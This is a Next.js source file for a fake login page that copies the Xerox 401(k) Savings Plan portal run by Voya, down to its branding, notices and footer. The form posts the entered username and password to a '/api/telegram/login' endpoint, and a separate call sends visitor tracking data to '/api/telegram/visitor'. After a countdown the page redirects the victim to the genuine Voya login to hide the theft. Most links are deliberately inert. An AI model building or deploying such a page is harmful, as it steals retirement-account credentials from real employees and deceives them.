"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Preloader } from "@/components/preloader";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [showContent, setShowContent] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [honeypot, setHoneypot] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [usernameError, setUsernameError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  const clearError = (field: string) => {
    if (field === "fu") setUsernameError(false);
    if (field === "fp") setPasswordError(false);
  };

  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setUsernameError(false);
    setPasswordError(false);

    if (!username) {
      setUsernameError(true);
      return;
    }
    if (!password) {
      setPasswordError(true);
      return;
    }
    if (isLoginLoading) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }

    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });

      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        window.location.href =
          "https://login.voya.com/voyassoui/index.html?domain=xerox401k.voya.com#/login-pweb";
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  const showToast = (message: string) => {
    const toast = document.getElementById("toast");
    if (toast) {
      toast.textContent = message;
      toast.classList.add("show");
      setTimeout(() => toast.classList.remove("show"), 2000);
    }
  };

  return (
    <>
      {!showContent && <Preloader onComplete={() => setShowContent(true)} />}
      {showContent && (
        <>
          <style>{`
            *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
            body {
              font-family: 'Open Sans', Arial, sans-serif;
              background: #fff;
              color: #333;
              min-height: 100vh;
              display: flex;
              flex-direction: column;
              font-size: 14px;
            }

            .topnav {
              background: #fff;
              border-bottom: 1px solid #ddd;
              padding: 20px 150px;
              display: flex;
              align-items: center;
              justify-content: space-between;
            }
            .xerox-logo {
              font-size: 2.2rem;
              font-weight: 900;
              color: #e31837;
              font-style: italic;
              letter-spacing: -0.04em;
              text-decoration: none;
              line-height: 1;
              font-family: Arial, sans-serif;
            }
            .xerox-logo sup {
              font-size: 0.4em;
              font-weight: 400;
              vertical-align: super;
              font-style: normal;
              letter-spacing: 0;
            }
            .nav-right { text-align: right; }
            .contact-link {
              display: block;
              font-size: 0.8rem;
              color: #c00;
              text-decoration: none;
              margin-bottom: 2px;
            }
            .contact-link:hover { text-decoration: underline; }
            .plan-title { font-size: 0.92rem; color: #222; font-weight: 400; }

            .hero-wrapper {
              padding: 0 150px;
              border-top: none;
            }
            .hero-grid {
              display: grid;
              grid-template-columns: 330px 1fr 325px;
              min-height: 365px;
              border: 1px solid #e0e0e0;
              border-top: none;
              margin: 0 0 0 0;
            }

            .login-col {
              border-right: 1px solid #e0e0e0;
              display: flex;
              flex-direction: column;
              background: #fff;
              width: 330px;
            }
            .red-top-bar {
              height: 7px;
              background: #e31837;
              width: 100%;
            }
            .login-inner {
              padding: 28px;
              flex: 1;
              display: flex;
              flex-direction: column;
            }
            .login-h {
              font-size: 1.5rem;
              font-weight: 300;
              color: #111;
              margin-bottom: 24px;
              letter-spacing: 0;
            }

            .field-wrap { margin-bottom: 8px; }
            .field-wrap input {
              width: 100%;
              max-width: 250px;
              height: 34px;
              border: 1px solid #bbb;
              border-radius: 3px;
              padding: 0 10px;
              font-size: 0.85rem;
              font-family: 'Open Sans', sans-serif;
              color: #666;
              outline: none;
              transition: border-color 0.15s;
            }
            .field-wrap input::placeholder { color: #999; font-size: 0.85rem; }
            .field-wrap input:focus {
              border-color: #e31837;
              box-shadow: 0 0 0 1px rgba(227,24,55,0.12);
            }
            .field-wrap.has-error input { border-color: #c0392b; }
            .err-txt {
              display: none;
              font-size: 0.7rem;
              color: #c0392b;
              margin-top: 2px;
            }
            .field-wrap.has-error .err-txt { display: block; }

            .forgot {
              display: block;
              font-size: 0.75rem;
              color: #c00;
              text-decoration: none;
              margin: 4px 0 18px;
            }
            .forgot:hover { text-decoration: underline; }

            .enter-row {
              display: flex;
              align-items: center;
              gap: 14px;
              margin-bottom: 14px;
            }
            .btn-enter {
              background: #e31837;
              color: #fff;
              border: none;
              border-radius: 20px;
              width: 168px;
              height: 36px;
              font-size: 0.9rem;
              font-weight: 700;
              font-family: 'Open Sans', sans-serif;
              cursor: pointer;
              display: inline-flex;
              align-items: center;
              justify-content: center;
              gap: 8px;
              letter-spacing: 0.01em;
              transition: background 0.15s;
            }
            .btn-enter:hover { background: #b5122b; }
            .btn-enter:disabled { opacity: 0.65; cursor: not-allowed; }

            .remember-lbl {
              display: flex;
              align-items: center;
              gap: 5px;
              font-size: 0.78rem;
              color: #444;
              cursor: pointer;
              white-space: nowrap;
            }
            .remember-lbl input[type=checkbox] {
              width: 13px; height: 13px;
              accent-color: #555;
              cursor: pointer;
            }

            @keyframes spin { to { transform: rotate(360deg); } }
            .spin-ring {
              display: none; width: 14px; height: 14px;
              border: 2px solid rgba(255,255,255,0.4);
              border-top-color: #fff;
              border-radius: 50%;
              animation: spin 0.65s linear infinite;
            }
            .spin-ring.show { display: block; }

            .first-time { font-size: 0.8rem; color: #444; margin-bottom: 10px; }

            .btm-row { display: flex; align-items: center; gap: 18px; }
            .btn-register {
              background: #fff;
              color: #e31837;
              border: 2px solid #e31837;
              border-radius: 20px;
              padding: 6px 18px;
              font-size: 0.82rem;
              font-weight: 700;
              font-family: 'Open Sans', sans-serif;
              cursor: pointer;
              transition: background 0.15s, color 0.15s;
            }
            .btn-register:hover { background: #e31837; color: #fff; }
            .need-help {
              font-size: 0.78rem;
              color: #c00;
              text-decoration: none;
            }
            .need-help:hover { text-decoration: underline; }

            .hero-photo {
              position: relative;
              overflow: hidden;
              background: #222;
            }
            .hero-photo img {
              width: 100%;
              height: 100%;
              object-fit: cover;
              object-position: center top;
              display: block;
            }
            .hero-caption {
              position: absolute;
              bottom: 18px;
              left: 16px;
              right: 16px;
              color: #fff;
              font-size: 1.15rem;
              font-weight: 300;
              line-height: 1.35;
              text-shadow: 0 1px 6px rgba(0,0,0,0.65);
            }

            .plan-cards {
              display: flex;
              flex-direction: column;
            }
            .card-red {
              background: #e31837;
              color: #fff;
              padding: 18px 16px;
              flex: 1;
              display: flex;
              gap: 14px;
              align-items: flex-start;
              justify-content: space-between;
            }
            .card-dark {
              background: #2d2d2d;
              color: #fff;
              padding: 18px 16px;
              flex: 1;
              display: flex;
              gap: 14px;
              align-items: flex-start;
              justify-content: space-between;
            }
            .card-body { flex: 1; min-width: 0; }
            .card-body h3 {
              font-size: 1.1rem;
              font-weight: 700;
              line-height: 1.25;
              margin-bottom: 8px;
              color: #fff;
            }
            .card-body p {
              font-size: 0.8rem;
              color: rgba(255,255,255,0.9);
              line-height: 1.45;
              margin-bottom: 8px;
            }
            .learn-more {
              font-size: 0.75rem;
              color: #fff;
              text-decoration: underline;
              cursor: pointer;
              background: none;
              border: none;
              padding: 0;
              font-family: inherit;
            }
            .card-thumb {
              width: 90px;
              height: 90px;
              flex-shrink: 0;
              border-radius: 4px;
              overflow: hidden;
              box-shadow: 0 1px 3px rgba(0,0,0,0.25);
            }
            .card-thumb img {
              width: 100%;
              height: 100%;
              object-fit: cover;
              display: block;
            }

            .updates {
              padding: 48px;
              max-width: 1200px;
              width: 100%;
              margin: 0 auto;
            }
            .updates h2 {
              font-size: 1.2rem;
              font-weight: 300;
              color: #222;
              margin-bottom: 4px;
              padding-left: 170px;
            }
            .red-rule {
              height: 4px;
              background: #e31837;
              margin-bottom: 22px;
            }
            .notices {
              display: grid;
              grid-template-columns: 1fr 1px 1fr 1px 1fr;
            }
            .notice { padding: 0 24px; }
            .notice:first-child { padding-left: 0; }
            .notice:last-child { padding-right: 0; }
            .notice.mid { background: #f0f0f0; border-radius: 2px; padding: 10px 16px; }
            .notice-sep { background: #ddd; width: 1px; }
            .notice a {
              font-size: 0.83rem;
              color: #c00;
              text-decoration: none;
              display: block;
              margin-bottom: 5px;
            }
            .notice a:hover { text-decoration: underline; }
            .notice p { font-size: 0.8rem; color: #555; line-height: 1.5; }

            footer {
              background: #f0f0f0;
              border-top: 1px solid #ddd;
              padding: 28px 48px;
              margin-top: auto;
            }
            .footer-inner {
              max-width: 1400px;
              margin: 0 auto;
              display: flex;
              align-items: center;
              gap: 32px;
              justify-content: space-between;
            }
            .footer-brand {
              flex-shrink: 0;
              display: flex;
              align-items: center;
              gap: 12px;
            }
            .footer-logo {
              height: 32px;
              width: auto;
              flex-shrink: 0;
            }
            .footer-copy {
              font-size: 0.72rem;
              color: #555;
              white-space: nowrap;
            }
            .voya-wordmark {
              display: none;
            }
            .footer-links {
              flex: 1;
              display: grid;
              grid-template-columns: 1fr 1fr 1fr 1fr;
              gap: 8px 24px;
              padding: 0;
            }
            .fl {
              display: block;
              font-size: 0.76rem;
              color: #333;
              text-decoration: none;
              white-space: nowrap;
            }
            .footer-right {
              flex-shrink: 0;
              display: flex;
              align-items: center;
              gap: 20px;
            }
            .lang-row {
              display: flex;
              align-items: center;
              gap: 4px;
              font-size: 0.76rem;
              color: #333;
              cursor: pointer;
              white-space: nowrap;
            }
            .lang-tri { color: #e31837; font-size: 0.5rem; }
            .socials { display: flex; gap: 8px; }
            .soc {
              width: 22px; height: 22px;
              background: #444;
              border-radius: 3px;
              display: flex; align-items: center; justify-content: center;
              text-decoration: none;
              transition: background 0.15s;
            }
            .soc:hover { background: #222; }

            #toast {
              position: fixed; bottom: 24px; left: 50%;
              transform: translateX(-50%) translateY(10px);
              background: #333; color: #fff;
              font-size: 0.8rem; padding: 9px 18px; border-radius: 3px;
              opacity: 0; pointer-events: none;
              transition: opacity 0.2s, transform 0.2s; z-index: 9999; white-space: nowrap;
            }
            #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

            @media (max-width: 1024px) {
              .hero-grid { grid-template-columns: 1fr; }
              .hero-wrapper { padding: 0 24px; }
              .topnav { padding: 16px 24px; }
              .updates { padding: 32px 24px; }
              .footer-inner { flex-direction: column; align-items: flex-start; }
              .footer-right { flex-direction: column; align-items: flex-start; gap: 16px; }
              .footer-links { grid-template-columns: 1fr 1fr; gap: 8px 16px; }
            }
            
            @media (max-width: 768px) {
              body { font-size: 13px; }
              .topnav { padding: 14px 16px; }
              .topnav { flex-direction: column; align-items: flex-start; gap: 8px; }
              .nav-right { width: 100%; text-align: left; }
              .hero-wrapper { padding: 0 16px; }
              .hero-grid { grid-template-columns: 1fr; min-height: auto; }
              .login-col { width: 100%; border-right: none; border-bottom: 1px solid #e0e0e0; }
              .red-top-bar { width: 100%; }
              .login-inner { padding: 20px; }
              .login-h { font-size: 1.3rem; margin-bottom: 16px; }
              .field-wrap input { width: 100%; max-width: 100%; }
              .enter-row { flex-wrap: wrap; }
              .btn-enter { width: 100%; }
              .plan-cards { flex-direction: column; }
              .card-red, .card-dark { padding: 16px; gap: 12px; }
              .card-body h3 { font-size: 1rem; }
              .card-body p { font-size: 0.75rem; }
              .card-thumb { width: 70px; height: 70px; }
              .hero-photo { min-height: 250px; }
              .hero-caption { font-size: 1rem; }
              .updates { padding: 24px 16px; }
              .updates h2 { font-size: 1.1rem; }
              .notices { grid-template-columns: 1fr; }
              .notice-sep { display: none; }
              .notice { padding: 0; border-bottom: 1px solid #e0e0e0; margin-bottom: 12px; }
              .notice:last-child { border-bottom: none; }
              .notice.mid { background: transparent; padding: 0; }
              footer { padding: 20px 16px; }
              .footer-brand { gap: 8px; }
              .footer-logo { height: 28px; }
              .footer-copy { font-size: 0.68rem; }
              .footer-links { grid-template-columns: 1fr; gap: 8px; width: 100%; }
              .fl { font-size: 0.72rem; }
              .lang-row { font-size: 0.72rem; }
              .socials { gap: 6px; }
              .soc { width: 20px; height: 20px; font-size: 0.65rem; }
            }
            
            @media (max-width: 480px) {
              body { font-size: 12px; }
              .topnav { padding: 12px 12px; }
              .xerox-logo { font-size: 1.8rem; }
              .plan-title { font-size: 0.8rem; }
              .contact-link { font-size: 0.7rem; }
              .hero-wrapper { padding: 0 12px; }
              .login-inner { padding: 16px; }
              .login-h { font-size: 1.2rem; margin-bottom: 14px; }
              .field-wrap { margin-bottom: 6px; }
              .field-wrap input { height: 32px; font-size: 0.8rem; padding: 0 8px; }
              .forgot { font-size: 0.7rem; margin: 3px 0 12px; }
              .btn-enter { font-size: 0.8rem; height: 34px; border-radius: 16px; }
              .btn-register { font-size: 0.75rem; padding: 5px 14px; }
              .first-time { font-size: 0.75rem; margin-bottom: 8px; }
              .btm-row { gap: 12px; flex-wrap: wrap; }
              .need-help { font-size: 0.7rem; }
              .card-red, .card-dark { padding: 12px; flex-direction: column; align-items: stretch; }
              .card-body h3 { font-size: 0.95rem; margin-bottom: 6px; }
              .card-body p { font-size: 0.7rem; margin-bottom: 4px; }
              .learn-more { font-size: 0.7rem; }
              .card-thumb { width: 100%; height: 150px; }
              .hero-photo { min-height: 200px; }
              .hero-caption { font-size: 0.9rem; bottom: 12px; left: 12px; right: 12px; }
              .updates { padding: 20px 12px; }
              .updates h2 { font-size: 1rem; margin-bottom: 2px; }
              .red-rule { height: 3px; margin-bottom: 16px; }
              .notice a { font-size: 0.75rem; margin-bottom: 3px; }
              .notice p { font-size: 0.7rem; }
              footer { padding: 16px 12px; }
              .footer-brand { flex-direction: column; align-items: flex-start; gap: 6px; width: 100%; }
              .footer-logo { height: 24px; }
              .footer-copy { font-size: 0.65rem; white-space: normal; }
              .footer-links { gap: 6px 12px; margin-top: 12px; }
              .footer-right { width: 100%; margin-top: 12px; }
              .lang-row { font-size: 0.68rem; }
            }
          `}</style>

          <nav className="topnav">
            <a
              className="xerox-logo"
              href="#"
              onClick={(e) => {
                e.preventDefault();
              }}
            >
              xerox<sup>™</sup>
            </a>
            <div className="nav-right">
              <a
                className="contact-link"
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                }}
              >
                Contact Us
              </a>
              <span className="plan-title">Xerox 401(k) Savings Plan</span>
            </div>
          </nav>

          <div className="hero-wrapper">
            <div className="hero-grid">
              <div className="login-col">
                <div className="red-top-bar"></div>
                <div className="login-inner">
                  <h2 className="login-h">Log In</h2>
                  <form id="lf" onSubmit={handleSignIn} noValidate>
                    <div
                      className={`field-wrap ${usernameError ? "has-error" : ""}`}
                      id="fu"
                    >
                      <input
                        type="text"
                        id="uid"
                        placeholder="Username"
                        autoComplete="username"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        onInput={() => clearError("fu")}
                      />
                      <div className="err-txt">Please enter your Username.</div>
                    </div>
                    <a
                      className="forgot"
                      href="#"
                      onClick={(e) => {
                        e.preventDefault();
                      }}
                    >
                      Forgot Username?
                    </a>

                    <div
                      className={`field-wrap ${passwordError ? "has-error" : ""}`}
                      id="fp"
                    >
                      <input
                        type="password"
                        id="pwd"
                        placeholder="Password"
                        autoComplete="current-password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onInput={() => clearError("fp")}
                      />
                      <div className="err-txt">Please enter your Password.</div>
                    </div>
                    <a
                      className="forgot"
                      href="#"
                      onClick={(e) => {
                        e.preventDefault();
                      }}
                    >
                      Forgot Password?
                    </a>

                    <input
                      type="text"
                      name="website"
                      value={honeypot}
                      onChange={(e) => setHoneypot(e.target.value)}
                      style={{ display: "none" }}
                      autoComplete="off"
                    />

                    <div className="enter-row">
                      <button
                        type="submit"
                        className="btn-enter"
                        id="eb"
                        disabled={isLoginLoading || !username || !password}
                      >
                        <div
                          className={`spin-ring ${isLoginLoading ? "show" : ""}`}
                          id="es"
                        ></div>
                        <span id="el">
                          {isLoginLoading ? "Entering..." : "Enter"}
                        </span>
                      </button>
                      <label className="remember-lbl">
                        <input
                          type="checkbox"
                          checked={rememberMe}
                          onChange={(e) => setRememberMe(e.target.checked)}
                        />
                        Remember Me
                      </label>
                    </div>

                    <p className="first-time">First time visitor?</p>
                    <div className="btm-row">
                      <button
                        type="button"
                        className="btn-register"
                        onClick={() => showToast("Opening registration…")}
                      >
                        Register Now
                      </button>
                      <a
                        className="need-help"
                        href="#"
                        onClick={(e) => {
                          e.preventDefault();
                        }}
                      >
                        Need Help?
                      </a>
                    </div>

                    {loginError && (
                      <p
                        style={{
                          color: "#c0392b",
                          fontSize: "0.75rem",
                          marginTop: "8px",
                        }}
                      >
                        {loginError}
                      </p>
                    )}
                  </form>
                </div>
              </div>

              <div className="hero-photo">
                <img
                  src="/xerox_enus.jpg"
                  alt="Welcome to your Xerox 401(k) Savings Plan"
                />
                <div className="hero-caption"></div>
              </div>

              <div className="plan-cards">
                <div className="card-red">
                  <div className="card-body">
                    <h3>
                      Plan News and
                      <br />
                      Updates
                    </h3>
                    <p>
                      Learn more about your plan and stay informed on the latest
                      updates and news.
                    </p>
                    <button
                      className="learn-more"
                      onClick={() => showToast("Plan News and Updates…")}
                    >
                      Learn More
                    </button>
                  </div>
                  <div className="card-thumb">
                    <img src="/stock.jpg" alt="Plan News and Updates" />
                  </div>
                </div>
                <div className="card-dark">
                  <div className="card-body">
                    <h3>
                      Boost Your
                      <br />
                      Knowledge
                    </h3>
                    <p>Timely topics, tips and tools.</p>
                    <button
                      className="learn-more"
                      onClick={() => showToast("Boost Your Knowledge…")}
                    >
                      Learn More
                    </button>
                  </div>
                  <div className="card-thumb">
                    <img src="/computers.jpg" alt="Boost Your Knowledge" />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="updates">
            <h2>Updates & Notices</h2>
            <div className="red-rule"></div>
            <div className="notices">
              <div className="notice">
                <a href="#">What Type of Investor Are You?</a>
                <p>
                  Learning about yourself can help you make smart choices for
                  your future.
                </p>
              </div>
              <div className="notice-sep"></div>
              <div className="notice mid">
                <a href="#">Voya Retire Mobile App</a>
                <p>
                  Keep in touch with your retirement savings with the mobile
                  app.
                </p>
              </div>
              <div className="notice-sep"></div>
              <div className="notice">
                <a href="#">Social Security Benefit Estimator</a>
                <p>
                  Generate your personal Social Security retirement benefit
                  estimate through the Social Security website.
                </p>
              </div>
            </div>
          </div>

          <footer>
            <div className="footer-inner">
              <div className="footer-brand">
                <img src="/logo.svg" alt="Voya" className="footer-logo" />
                <p className="footer-copy">
                  ©2026 Voya Service Company. All rights reserved.
                </p>
              </div>
              <div className="footer-links">
                <a
                  href="#"
                  className="fl"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Terms of Use/Online Privacy
                </a>
                <a
                  href="#"
                  className="fl"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Accessibility
                </a>
                <a
                  href="#"
                  className="fl"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Security
                </a>
                <a
                  href="#"
                  className="fl"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Browser Requirements
                </a>
                <a
                  href="#"
                  className="fl"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Privacy Notice
                </a>
                <a
                  href="#"
                  className="fl"
                  onClick={(e) => {
                    e.preventDefault();
                  }}
                >
                  Get Adobe Reader
                </a>
              </div>
              <div className="footer-right">
                <div className="lang-row">
                  <span>English</span>
                  <span className="lang-tri">▼</span>
                </div>
                <div className="socials">
                  <a
                    href="#"
                    className="soc"
                    title="Facebook"
                    onClick={(e) => e.preventDefault()}
                  >
                    f
                  </a>
                  <a
                    href="#"
                    className="soc"
                    title="LinkedIn"
                    onClick={(e) => e.preventDefault()}
                  >
                    in
                  </a>
                  <a
                    href="#"
                    className="soc"
                    title="YouTube"
                    onClick={(e) => e.preventDefault()}
                  >
                    ▶
                  </a>
                  <a
                    href="#"
                    className="soc"
                    title="Instagram"
                    onClick={(e) => e.preventDefault()}
                  >
                    📷
                  </a>
                </div>
              </div>
            </div>
          </footer>

          <div id="toast"></div>
        </>
      )}
    </>
  );
}
